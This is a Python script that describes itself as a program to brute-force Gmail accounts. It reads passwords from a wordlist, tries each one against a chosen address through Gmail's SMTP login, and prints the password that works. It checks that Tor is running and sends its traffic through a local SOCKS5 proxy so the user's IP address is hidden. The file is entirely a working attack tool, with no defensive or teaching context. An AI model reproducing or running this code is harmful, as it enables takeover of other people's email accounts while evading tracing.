import smtplib
import argparse
import os
import socks
import requests
import socket
import subprocess
import time

def check_tor_running():
	try:
		subprocess.check_output(["pidof", "tor"])
	except subprocess.CalledProcessError:
		print("[-] Tor not running exiting.")
		exit()


class Colors:

	@staticmethod
	def red_color(color):
		return "\033[2;31;10m" + color

	@staticmethod
	def purple_color(color):
		return "\033[1;30;10m" + color

	@staticmethod
	def bright_blue(color):
		return "\033[1;34;10m" + color

	@staticmethod
	def green_color(color):
		return "\033[1;32;10m" + color

	@staticmethod
	def white_color(color):
		return "\033[1;37;10m" + color

class Parser:
	def __init__(self):
		self.args = argparse.ArgumentParser(description="Program to bruteforce emails on gmail")
		self.args.add_argument("--email", help="Email you choose to bruteforce", required=True)
		self.args.add_argument("--file", help="Wordlist to pick and try to use to bruteforce", type=self.validate_file, required=True)
		self.args.add_argument("--proxy", help="Set a proxy if you need it. Slower login attempts if set proxy")

		self.args_parsed = self.args.parse_args()

	def get_email(self):
		return self.args_parsed.email

	def get_file(self):
		return self.args_parsed.file

	def validate_file(self, file):
		if not os.path.exists(file) or not file.lower().endswith(".txt"):
			print(Colors.red_color(f"[-] Invalid file: {file}"))
			exit()
		return file


class Email:
	def __init__(self, email, password):
		self.email = email
		self.password = password

		self.email_connection(self.email, self.password)


	def email_connection(self, email, password):
		gmail_server = smtplib.SMTP('smtp.gmail.com', 587)
		gmail_server.starttls()

		try:
			gmail_server.login(email, password)
			correct_password = f"[+] Got the password [==>] {password}"
			print(Colors.green_color(correct_password))
			exit()
		except smtplib.SMTPAuthenticationError:
			incorrect_password = f"[-] Incorrect password [==>] {password}"
			print(Colors.purple_color(incorrect_password))
			time.sleep(3)


class Proxy:
	def __init__(self):
		self.current_ip = requests.get("http://icanhazip.com")

	def change_ip(self):
		get_ip = f"[-] Your current IP is {self.current_ip.content.decode()}"
		print(Colors.red_color(get_ip))
		print("\n")

		socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
		socket.socket = socks.socksocket

		fresh_ip = requests.get("http://icanhazip.com")
		new_ip = f"[+] New IP --> {fresh_ip.content.decode()}"
		print(Colors.bright_blue(new_ip))



class BruteForce(Parser):
	def __init__(self):
		super().__init__()
		self.email = self.get_email()
		self.file = self.get_file()

	def read_file(self):
		with open(self.file, "r") as file:
			content = file.readlines()

		for words in content:
			words = words.strip()
			yield words

	def email_login(self):
		password_list = self.read_file()
		count = 0

		for passwords in password_list:
			count += 1
			Email(self.email, passwords)
			print(f"Amount of tires --> {str(count)}")
		print("\n[-] Password was not found.")


if __name__ == '__main__':
	try:
		check_tor_running()
		Proxy().change_ip()
		BruteForce().email_login()
	except KeyboardInterrupt:
		print("[-] Exiting.")
		exit()
